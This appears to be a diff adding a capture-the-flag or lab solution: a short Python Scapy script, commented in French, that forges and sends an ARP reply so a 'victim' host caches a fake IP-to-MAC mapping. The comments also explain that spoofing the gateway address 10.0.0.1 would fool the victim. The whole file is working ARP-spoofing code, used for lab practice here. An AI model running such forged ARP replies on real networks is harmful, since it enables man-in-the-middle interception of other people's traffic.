@@ -1,0 +1,18 @@
+from scapy.all import Ether, ARP, sendp
+
+# Construire la réponse manuellement
+reply = Ether(dst="aa:bb:cc:dd:ee:ff") / ARP(
+    op=2,              # 2 = is-at (réponse)
+    psrc="10.0.0.42",   # IP source (celui qui répond)
+    pdst="10.0.0.2",   # IP destination (celui qui a demandé)
+    hwsrc="42:42:42:42:42:42",  # MAC source
+    hwdst="e2:51:8a:9c:c8:df"   # MAC destination
+)
+
+sendp(reply, verbose=False)   
+
+#Avec psrc="10.0.0.42" : La victime enregistre 10.0.0.42 = 42:42.... Le système du challenge inspecte la mémoire de la victime,
+#trouve bien cette entrée, et valide le défi.
+
+#Avec psrc="10.0.0.1" : La victime enregistre 10.0.0.1 = 42:42.... Elle vous croit sur parole ! Mais le système du challenge échoue,
+#car il attendait spécifiquement que vous créiez une entrée pour l'IP .42, pas pour la .1.
